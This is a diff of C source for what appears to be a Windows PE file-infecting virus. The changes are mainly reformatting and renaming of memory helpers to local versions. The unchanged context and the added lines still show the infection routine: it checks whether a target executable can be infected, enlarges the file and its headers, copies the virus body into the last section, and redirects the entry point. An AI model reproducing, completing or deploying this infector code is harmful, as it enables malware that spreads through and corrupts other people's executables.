@@ -20,7 +20,8 @@ typedef struct {
 
 static int can_infect(const char *filename);
 static void modify_headers(IMAGE_NT_HEADERS *nt_headers);
-static void *copy_code(IMAGE_NT_HEADERS *nt_headers, void * target_start_address);
+static void *copy_code(IMAGE_NT_HEADERS *nt_headers,
+                       void *target_start_address);
 static void modify_entrypoint(IMAGE_NT_HEADERS *nt_headers,
                               uint32_t entry_offset, void *target_code_begin);
 static uint32_t get_extended_file_size(const char *filename);
@@ -30,7 +31,7 @@ static void close_file_view(file_view_t *file_view);
 int infect(const char *filename, void *entry_function_addr) {
     if (can_infect(filename)) {
         file_view_t file_view;
-        memzero(&file_view, sizeof(file_view_t));
+        memzero_local(&file_view, sizeof(file_view_t));
 
         uint32_t extended_size = get_extended_file_size(filename);
         file_view.size = extended_size;
@@ -38,7 +39,8 @@ int infect(const char *filename, void *entry_function_addr) {
             IMAGE_NT_HEADERS *nt_headers =
                 get_nt_header_by_base(file_view.start_address);
             modify_headers(nt_headers);
-            void *target_code_begin = copy_code(nt_headers, file_view.start_address);
+            void *target_code_begin =
+                copy_code(nt_headers, file_view.start_address);
             uint32_t entry_offset =
                 (uint32_t)BYTE_DIFF(entry_function_addr, code_begin);
 
@@ -83,12 +85,13 @@ static void modify_headers(IMAGE_NT_HEADERS *nt_headers) {
         sizeof(IMAGE_SECTION_HEADER), nt_headers->OptionalHeader.FileAlignment);
 }
 
-static void *copy_code(IMAGE_NT_HEADERS *nt_headers, void * target_start_address) {
+static void *copy_code(IMAGE_NT_HEADERS *nt_headers,
+                       void *target_start_address) {
     IMAGE_SECTION_HEADER *section_header = get_last_section_header(nt_headers);
     void *target_code_begin =
         BYTE_OFFSET(target_start_address, section_header->PointerToRawData);
-    memcp(BYTE_OFFSET(code_begin, get_delta_offset()), target_code_begin,
-          CODE_SIZE);
+    memcpy_local(BYTE_OFFSET(code_begin, get_delta_offset()), target_code_begin,
+                 CODE_SIZE);
     return target_code_begin;
 }
 
@@ -108,7 +111,7 @@ static void modify_entrypoint(IMAGE_NT_HEADERS *nt_headers,
 
 static int can_infect(const char *filename) {
     file_view_t fw;
-    memzero(&fw, sizeof(file_view_t));
+    memzero_local(&fw, sizeof(file_view_t));
 
     if (open_file_view(filename, &fw) != 0) {
         PRINT_DEBUG("can't infect \"%s\": could not open file", filename);
@@ -142,7 +145,7 @@ static int can_infect(const char *filename) {
 
 static uint32_t get_extended_file_size(const char *filename) {
     file_view_t fw;
-    memzero(&fw, sizeof(file_view_t));
+    memzero_local(&fw, sizeof(file_view_t));
 
     if (open_file_view(filename, &fw) != 0) {
         PRINT_DEBUG("could not open view of file");
@@ -198,5 +201,5 @@ static void close_file_view(file_view_t *file_view) {
     UNMAP_VIEW_OF_FILE((LPCVOID)file_view->start_address);
     CLOSE_HANDLE(file_view->h_map);
     CLOSE_HANDLE(file_view->h_file);
-    memzero(file_view, sizeof(file_view_t));
+    memzero_local(file_view, sizeof(file_view_t));
 }
